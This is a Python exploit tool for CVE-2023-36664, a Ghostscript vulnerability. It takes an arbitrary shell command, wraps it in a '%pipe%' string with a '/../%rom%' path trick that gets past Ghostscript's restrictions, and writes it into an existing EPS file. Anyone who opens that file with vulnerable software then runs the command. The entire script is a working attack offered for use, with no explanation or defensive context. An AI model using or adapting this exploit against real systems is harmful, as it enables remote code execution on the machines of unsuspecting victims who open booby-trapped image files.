import argparse
import os

# Function to inject payload into an eps file
def inject_payload(filename, payload):
  # Verify if the file has a suitable extension
  if filename.lower().endswith('.eps'):
    # Read the existing content of the file
    with open(filename, 'r') as file:
      lines = file.readlines()

    # Find the first not commented line
    for i, line in enumerate(lines):
      if not line.strip().startswith('%'):
        # Insert the payload
        lines.insert(i, payload + '\n')
        break

    # Write the modified content back to the file
    with open(filename, 'w') as eps_file:
      eps_file.writelines(lines)

  else:
    print("Only EPS extensions can be processed.")

def main():
  parser = argparse.ArgumentParser(description="Inject payload for CVE-2023-36664 in an EPS file.")
  parser.add_argument("-p", "--payload", help="Payload to inject.")
  parser.add_argument("-f", "--filename", help="Filename for the injected file.")
  args = parser.parse_args()

  if args.payload:
    payload = args.payload
  else:
    print("A payload is required")
    return
  
  payload = f"(%pipe%{payload};/../%rom%lib/test) (r) file"
  
  if os.path.exists(args.filename):
    inject_payload(args.filename, payload)
    print(f"Payload successfully injected into {args.filename}.")
  else:
    print(f"File {args.filename} not found.")

if __name__ == "__main__":
    main()